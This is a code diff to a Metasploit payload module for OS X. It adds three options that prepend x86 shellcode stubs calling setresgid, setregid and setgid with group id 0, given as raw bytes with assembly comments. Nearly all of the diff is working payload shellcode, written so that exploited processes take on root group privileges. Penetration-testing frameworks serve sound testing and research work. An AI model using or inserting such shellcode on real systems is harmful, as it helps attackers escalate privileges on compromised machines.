@@ -40,6 +40,27 @@ module Msf::Payload::Osx
 						"false"
 					]
 				),
+				Msf::OptBool.new('PrependSetresgid',
+					[
+						false,
+						"Prepend a stub that executes the setresgid(0, 0, 0) system call",
+						"false"
+					]
+				),
+				Msf::OptBool.new('PrependSetregid',
+					[
+						false,
+						"Prepend a stub that executes the setregid(0, 0) system call",
+						"false"
+					]
+				),
+				Msf::OptBool.new('PrependSetgid',
+					[
+						false,
+						"Prepend a stub that executes the setgid(0) system call",
+						"false"
+					]
+				),
 				Msf::OptBool.new('AppendExit',
 					[
 						false,
@@ -99,6 +120,35 @@ module Msf::Payload::Osx
 				       "\xcd\x80"              #   int     $0x80                      #
 			end
 
+			if (datastore['PrependSetresgid'])
+				# setresgid(0, 0, 0)
+				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x66\xb8\x38\x01"     +#   movw    $0x0138,%ax                #
+				       "\xcd\x80"              #   int     $0x80                      #
+			end
+
+			if (datastore['PrependSetregid'])
+				# setregid(0, 0)
+				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\xb0\x7f"             +#   movb    $0x7f,%al                  #
+				       "\xcd\x80"              #   int     $0x80                      #
+			end
+
+			if (datastore['PrependSetgid'])
+				# setgid(0)
+				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\xb0\xb5"             +#   movb    $0xb5,%al                  #
+				       "\xcd\x80"              #   int     $0x80                      #
+			end
 			# Append
 
 			if (datastore['AppendExit'])
